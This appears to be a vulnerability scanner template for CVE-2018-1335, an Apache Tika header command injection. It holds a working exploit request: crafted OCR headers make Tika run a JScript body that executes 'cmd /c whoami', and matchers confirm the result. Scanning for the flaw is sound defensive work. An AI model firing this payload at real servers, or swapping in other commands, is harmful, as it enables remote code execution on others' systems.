id: CVE-2018-1335
info:
  author: pikpikcu
  edb: https://www.exploit-db.com/exploits/47208
  name: Apache Tika 1.15-1.17 Header Command Injection
  reference: https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
  severity: critical
  tags: cve,cve2018,apache,tika,rce
requests:
- body: var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec("cmd
    /c whoami");
  headers:
    Connection: close
    Content-type: image/jp2
    Expect: 100-continue
    X-Tika-OCRLanguage: //E:Jscript
    X-Tika-OCRTesseractPath: cscript
  matchers:
  - part: header
    type: word
    words:
    - 'Content-Type: text/csv'
  - condition: and
    part: body
    type: word
    words:
    - org.apache.tika.parser.DefaultParser
    - org.apache.tika.parser.gdal.GDALParse
  - status:
    - 200
    type: status
  matchers-condition: and
  method: PUT
  path:
  - '{{BaseURL}}/meta'
